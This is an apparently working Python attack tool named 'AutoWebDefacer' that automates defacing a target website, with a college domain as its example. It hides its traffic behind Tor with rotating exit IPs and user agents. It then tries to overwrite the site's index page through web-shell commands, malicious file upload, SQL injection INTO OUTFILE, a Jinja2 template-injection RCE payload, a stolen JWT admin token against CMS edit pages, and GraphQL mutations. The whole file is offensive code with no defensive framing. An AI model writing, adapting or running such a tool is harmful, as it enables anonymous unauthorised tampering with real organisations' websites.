#!/usr/bin/env python3
"""
AutoWebDefacer - Automated Website Content Modifier with Anonymity
Author: adrianxd
Requires: Kali Linux, Tor, python3, libraries below
Usage: python3 autodefacer.py --target https://college.edu --message "Hacked by Anonymous"
"""

import json
import re
import sys
import os
import time
import random
import argparse
import base64
import requests
import subprocess
from urllib.parse import urljoin, urlparse, quote
from stem import Signal
from stem.control import Controller

# ========== ANONYMITY CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
]

PROXY_LIST = [
    "socks5h://127.0.0.1:9050",   # Tor default
    "socks5h://127.0.0.1:9150"    # Tor Browser bundle
]

def renew_tor_ip():
    """Request new Tor exit node"""
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password="")  # default Tor auth
            controller.signal(Signal.NEWNYM)
            time.sleep(2)
            return True
    except Exception as e:
        print(f"[!] Tor renewal failed: {e}")
        return False

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_tor_session():
    session = requests.Session()
    session.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    session.headers.update({"User-Agent": get_random_user_agent()})
    return session

# ========== EXPLOIT MODULES ==========
class ContentModifier:
    def __init__(self, target_url, message, vuln_file="vulnerabilities.json"):
        self.target = target_url.rstrip('/')
        self.message = message
        self.vulns = self.load_vulns(vuln_file)
        self.session = get_tor_session()
        self.modified = False

    def load_vulns(self, file):
        if not os.path.exists(file):
            print(f"[!] {file} not found. Run college_hack_pro.py first.")
            sys.exit(1)
        with open(file, 'r') as f:
            return json.load(f)

    def run(self):
        print("[*] Starting automated website defacement with anonymity")
        # Prioritize exploit methods
        for vuln in self.vulns:
            vtype = vuln.get("type", "")
            if vtype == "Web Shell" and "url" in vuln:
                self.deface_via_shell(vuln["url"])
            elif vtype == "File Upload":
                self.deface_via_upload(vuln)
            elif vtype == "SQLi":
                self.deface_via_sqli(vuln)
            elif vtype == "SSTI":
                self.deface_via_ssti(vuln)
            elif vtype == "JWT admin token":
                self.deface_via_jwt(vuln)
            elif vtype == "GraphQL introspection":
                self.deface_via_graphql(vuln)
            if self.modified:
                break
        if not self.modified:
            print("[!] No working exploit found for content modification.")

    def deface_via_shell(self, shell_url):
        print(f"[*] Trying web shell at {shell_url}")
        cmd = f"echo '{self.message}' > /var/www/html/index.html"
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        payload = f"{shell_url}?cmd=echo {encoded_cmd} | base64 -d | bash"
        try:
            r = self.session.get(payload, timeout=10)
            if r.status_code == 200:
                print("[+] Website defaced via web shell")
                self.modified = True
                return True
        except:
            pass
        # Try alternative paths
        alt_paths = ["/var/www/index.html", "/usr/share/nginx/html/index.html", "/home/www/public/index.html"]
        for path in alt_paths:
            cmd2 = f"echo '{self.message}' > {path}"
            encoded2 = base64.b64encode(cmd2.encode()).decode()
            payload2 = f"{shell_url}?cmd=echo {encoded2} | base64 -d | bash"
            try:
                r2 = self.session.get(payload2, timeout=5)
                if r2.status_code == 200:
                    print(f"[+] Defaced {path}")
                    self.modified = True
                    return True
            except:
                continue
        return False

    def deface_via_upload(self, vuln):
        url = vuln.get("url")
        if not url:
            return False
        print(f"[*] Attempting deface via file upload at {url}")
        files = {"file": ("index.html", self.message, "text/html")}
        try:
            r = self.session.post(url, files=files, timeout=10)
            if r.status_code in [200, 302]:
                # Check if file accessible
                test_url = urljoin(self.target, "uploads/index.html")
                check = self.session.get(test_url)
                if check.status_code == 200:
                    print("[+] Website defaced via file upload")
                    self.modified = True
                    return True
        except:
            pass
        return False

    def deface_via_sqli(self, vuln):
        url = vuln.get("url")
        payload = vuln.get("payload")
        if not url or not payload:
            return False
        print(f"[*] Attempting deface via SQLi at {url}")
        # Try INTO OUTFILE
        sql_payload = f"' UNION SELECT '{self.message}' INTO OUTFILE '/var/www/html/index.html' -- "
        test_url = url.replace(payload, quote(sql_payload))
        try:
            r = self.session.get(test_url, timeout=10)
            if r.status_code == 200:
                # Verify deface
                check = self.session.get(self.target)
                if self.message in check.text:
                    print("[+] Website defaced via SQLi")
                    self.modified = True
                    return True
        except:
            pass
        return False

    def deface_via_ssti(self, vuln):
        url = vuln.get("url")
        payload = vuln.get("payload")
        if not url or not payload:
            return False
        print(f"[*] Attempting deface via SSTI at {url}")
        # Jinja2 RCE to write file
        code = f'{{{{ config.__class__.__init__.__globals__["os"].popen("echo \\"{self.message}\\" > /var/www/html/index.html").read() }}}}'
        test_url = url.replace(payload, quote(code))
        try:
            r = self.session.get(test_url, timeout=10)
            if r.status_code == 200:
                check = self.session.get(self.target)
                if self.message in check.text:
                    print("[+] Website defaced via SSTI")
                    self.modified = True
                    return True
        except:
            pass
        return False

    def deface_via_jwt(self, vuln):
        token = vuln.get("token")
        if not token:
            return False
        print("[*] Attempting deface via JWT admin token")
        admin_session = get_tor_session()
        admin_session.headers.update({"Authorization": f"Bearer {token}"})
        # Try common CMS endpoints
        endpoints = ["/admin/pages/edit/1", "/cms/page/1/edit", "/wp-admin/post.php?post=1&action=edit", "/administrator/index.php?option=com_content&task=edit&id=1"]
        for ep in endpoints:
            full = urljoin(self.target, ep)
            try:
                # Get edit form
                resp = admin_session.get(full, timeout=10)
                if resp.status_code == 200:
                    # Extract nonce if needed
                    nonce_match = re.search(r'name="_wpnonce" value="([a-f0-9]+)"', resp.text)
                    data = {"content": self.message, "post_title": "Defaced", "action": "update"}
                    if nonce_match:
                        data["_wpnonce"] = nonce_match.group(1)
                    post_resp = admin_session.post(full, data=data, timeout=10)
                    if post_resp.status_code in [200, 302]:
                        check = admin_session.get(self.target)
                        if self.message in check.text:
                            print("[+] Website defaced via JWT admin")
                            self.modified = True
                            return True
            except:
                continue
        return False

    def deface_via_graphql(self, vuln):
        # Attempt to find mutation
        schema_file = "graphql_schema.json"
        if not os.path.exists(schema_file):
            print("[!] No graphql_schema.json, cannot use GraphQL")
            return False
        with open(schema_file, 'r') as f:
            schema = json.load(f)
        # Find mutation fields
        mutations = []
        if "data" in schema and "__schema" in schema["data"]:
            for t in schema["data"]["__schema"].get("types", []):
                if "mutation" in t.get("name", "").lower():
                    for field in t.get("fields", []):
                        mutations.append(field["name"])
        if not mutations:
            return False
        endpoint = urljoin(self.target, "/graphql")
        for mutation in mutations:
            query = f"mutation {{ {mutation}(id:1, content:\"{self.message}\") {{ success }} }}"
            try:
                r = self.session.post(endpoint, json={"query": query}, timeout=10)
                if r.status_code == 200 and "success" in r.text.lower():
                    print(f"[+] Website defaced via GraphQL mutation {mutation}")
                    self.modified = True
                    return True
            except:
                continue
        return False

# ========== MAIN ==========
def main():
    parser = argparse.ArgumentParser(description="Auto website defacer with anonymity via Tor")
    parser.add_argument("--target", required=True, help="Target website URL (e.g., https://college.edu)")
    parser.add_argument("--message", default="Hacked by Anonymous", help="Message to display on defaced page")
    parser.add_argument("--vulns", default="vulnerabilities.json", help="Path to vulnerabilities.json file")
    args = parser.parse_args()

    # Check Tor is running
    try:
        test_session = get_tor_session()
        test_session.get("http://check.torproject.org", timeout=10)
        print("[+] Tor proxy is working")
    except:
        print("[!] Tor is not running. Start Tor: sudo systemctl start tor")
        print("    Then run: python3 autodefacer.py ...")
        sys.exit(1)

    # Renew IP for fresh identity
    renew_tor_ip()
    time.sleep(1)

    modifier = ContentModifier(args.target, args.message, args.vulns)
    modifier.run()
    if modifier.modified:
        print("[+] Defacement successful. Visit the target to see changes.")
    else:
        print("[!] Could not modify content. No suitable vulnerability or method failed.")

if __name__ == "__main__":
    main()
